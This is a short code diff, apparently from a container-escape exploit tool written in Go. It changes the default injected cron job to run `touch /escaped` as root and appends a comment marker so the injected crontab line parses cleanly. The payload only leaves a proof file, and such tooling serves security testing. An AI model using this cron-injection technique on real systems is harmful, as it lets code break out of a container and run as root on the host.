@@ -14,7 +14,7 @@ var (
 			Name:    "job",
 			Aliases: []string{"j"},
 			Usage:   "",
-			Value:   "* * * * * touch /escaped",
+			Value:   "* * * * * root touch /escaped",
 		},
 	}
 	ExploitCmd = app.Vul2ExploitCmd(&Vul, aliases, flagsExploit, true)
@@ -43,5 +43,6 @@ func (v *vulnerability) Exploit(context *cli.Context) (err error) {
 	if err := v.BaseVulnerability.Exploit(context); err != nil {
 		return err
 	}
-	return Load(context.String("job"))
+	job := context.String("job") + " #"
+	return Load(job)
 }
